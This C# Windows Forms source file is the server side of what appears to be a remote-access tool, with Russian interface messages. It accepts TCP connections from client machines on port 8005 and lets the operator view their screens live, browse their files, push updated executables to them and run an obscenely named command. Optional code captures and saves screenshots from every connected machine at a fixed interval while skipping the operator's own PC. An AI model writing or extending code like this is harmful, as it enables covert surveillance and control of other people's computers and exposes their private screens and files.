using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace server
{
    public partial class Form1 : Form
    {
        private static int DELAY = 7000;
        private static bool OWN_IMG = false;
        static HashSet<Task> activeClientTasks = new HashSet<Task>();
        static List<Client> clients = new List<Client>();
        static bool isVideo = true;
        public delegate void MethodContainer();

        public static event MethodContainer OnClientsChange;



        public Form1()
        {
            InitializeComponent();
            button2.Enabled = false;
            buttonUpdate.Enabled = false;
            // Client c = new Client(new TcpClient());
            OnClientsChange += ListBoxClientsRefresh;
            try
            {
                StartListener();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private static async void StartListener()
        {
            try
            {
                var tcpListener = TcpListener.Create(8005);
                tcpListener.Start();
                while (true)
                {
                    var tcpClient = await tcpListener.AcceptTcpClientAsync();
                    processClient(tcpClient);
                }
            }
            catch (Exception ex)
            {
                throw new Exception();

            }
        }

        static async Task processClient(TcpClient c)
        {
            Client client = new Client(c);
            Client cTemp;
            await client.GetName();
            cTemp = (clients.Find(x => x.Name == client.Name));

            if (cTemp != null)
            {
                cTemp.s = client.s;
            }
            else
            {
                clients.Add(client);
            }


            OnClientsChange();
        }

        private void ListBoxClientsRefresh()
        {

            // listBoxClients.Items.Clear();
            foreach (Client client in clients)
            {
                if (!listBoxClients.Items.Contains(client))
                {
                    listBoxClients.Items.Add(client);
                }

            }
        }

        private void buttonRefresh_Click(object sender, EventArgs e)
        {
            listBoxClients.Items.Clear();
            ListBoxClientsRefresh();
            // this.Invalidate();
        }

        private void button1_Click(object sender, EventArgs e)
        {

            Client cl = listBoxClients.SelectedItem as Client;
            if (cl == null)
            {
                MessageBox.Show("Пожалуйста выберите пользователя");
            }
            else
            {
                try
                {
                    cl.GetName();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    Console.WriteLine(ex.Message);
                }
            }


        }

        private void button2_Click(object sender, EventArgs e)
        {
            Client cl = listBoxClients.SelectedItem as Client;
            if (cl == null)
            {
                MessageBox.Show("Пожалуйста выберите пользователя");
            }
            else
            {
                cl.TobiPizda();
            }
        }

        private async void buttonScreen_Click(object sender, EventArgs e)
        {
            try
            {
                Client cl = listBoxClients.SelectedItem as Client;
                if (cl == null)
                {
                    MessageBox.Show("Пожалуйста выберите пользователя");
                }
                else
                {
                    await cl.GetScreenshot();
                    pictureBoxScreenshot.Image = cl.screen;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }



        private async void buttonNewVersion_Click(object sender, EventArgs e)
        {
            try
            {
                Client cl = listBoxClients.SelectedItem as Client;
                if (cl == null)
                {
                    MessageBox.Show("Пожалуйста выберите пользователя");
                }
                else
                {
                    await cl.NewVersion(richTextBox1.Text);
                    if (cl.isSuccefullUpdate)
                    {
                        richTextBox1.Text = "Success";
                        this.Invalidate();
                    }
                    else
                    {
                        richTextBox1.Text = "Fail ";
                        richTextBox1.AppendText(cl.exeptionString);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }

        private async void buttonVideo_Click(object sender, EventArgs e)
        {
            try
            {
                Task t;
                for (int i = 0; i < 100; i++)
                {
                    if (!isVideo)
                    {
                        isVideo = true;
                        break;
                    }

                    Client cl = listBoxClients.SelectedItem as Client;
                    if (cl == null)
                    {
                        MessageBox.Show("Пожалуйста выберите пользователя");
                    }
                    else
                    {
                        t = cl.GetScreenshot();
                        await t;
                        t.Wait();
                        if (t.IsCompleted)
                            pictureBoxScreenshot.Image = cl.screen;
                        Thread.Sleep(1000);
                    }
                }
                //t.Dispose();

            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private async void buttonUpdate_Click(object sender, EventArgs e)
        {
            try
            {
                Client cl = listBoxClients.SelectedItem as Client;
                if (cl == null)
                {
                    MessageBox.Show("Пожалуйста выберите пользователя");
                }
                else
                {
                    await cl.UpdateApplication();
                    if (cl.isSuccefullUpdate)
                    {
                        richTextBox1.Text = "Success";
                    }
                    else
                    {
                        richTextBox1.Text = "Fail ";
                        richTextBox1.AppendText(cl.exeptionString);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                button2.Enabled = true;
                buttonUpdate.Enabled = true;
            }
            else
            {
                buttonUpdate.Enabled = false;
                button2.Enabled = true;

            }
        }

        private void buttonFilesExplorer_Click(object sender, EventArgs e)
        {
            try
            {
                Client cl = listBoxClients.SelectedItem as Client;
                if (cl == null)
                {
                    MessageBox.Show("Пожалуйста выберите пользователя");
                }
                else
                {
                    Form fileExplorer = new FilesExplorer(cl);
                    fileExplorer.Show();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }


        }

        private void buttonStopVideo_Click(object sender, EventArgs e)
        {
            isVideo = false;
        }

        private async void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
           //     buttonFilesExplorer.Enabled = false;

                await Task.Run(async () => { await SaveImages();}) ;

            }
        }

        public async Task SaveImages()
        {
            while(checkBox2.Checked)
            try
            {
                while(checkBox2.Checked)
                {
                    foreach (var cl in listBoxClients.Items.OfType<Client>())
                    {
                        bool isYou = string.Compare(cl.Name, "MACHINEGUN-PC", StringComparison.OrdinalIgnoreCase) == 0;
                        if (isYou)
                        {
                            if (OWN_IMG)
                            {
                                await cl.GetScreenshot();
                                await ImageSave(cl.screen, cl.Name.ToString());
                            }
                        }
                        else
                            {
                                await cl.GetScreenshot();
                                await ImageSave(cl.screen, cl.Name.ToString());
                            }
                    }
                    Thread.Sleep(DELAY);

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                richTextBox1.AppendText("\n"+ex.Message);
                Thread.Sleep(DELAY);
                }
        }

        public async Task ImageSave(Bitmap screen, string clientName)
        {
            string currentAssembly = Assembly.GetExecutingAssembly().Location;
            if (currentAssembly == null)
                throw new ArgumentNullException("current assembly location");

            string filePath = Path.GetFullPath(currentAssembly);
            string destinationDirectory = Path.Combine(Directory.GetCurrentDirectory(),
                clientName /*.Replace(@"\", @"//")*/);

            if (String.IsNullOrEmpty(clientName))
                clientName = "null" + new Random().Next() % 1000000;
            if (!Directory.Exists(destinationDirectory))
                Directory.CreateDirectory(destinationDirectory);


         //   string outputFileName = "...";
            using (MemoryStream memory = new MemoryStream())
            {
                using (FileStream fs = new FileStream(Path.Combine(destinationDirectory, DateTime.Now.AddHours(3).ToString().Replace('.', '_').Replace(':', '-').Replace('/','_') + @".jpg"), FileMode.Create, FileAccess.ReadWrite))
                {
                    screen.Save(memory, ImageFormat.Jpeg);
                    byte[] bytes = memory.ToArray();
                    fs.Write(bytes, 0, bytes.Length);
                }
            }

            //screen.Save(Path.Combine(destinationDirectory, DateTime.Now.ToString().Replace('.','_').Replace(':','-') + @".jpg"),
            //    System.Drawing.Imaging.ImageFormat.Jpeg);
                screen.Dispose();


        }

        private void numericUpDownDelay_ValueChanged(object sender, EventArgs e)
        {
            DELAY = (int)(numericUpDownDelay.Value);
        }

        private void checkBoxOwn_CheckedChanged(object sender, EventArgs e)
        {
            OWN_IMG = checkBoxOwn.Checked;
        }
    }
}
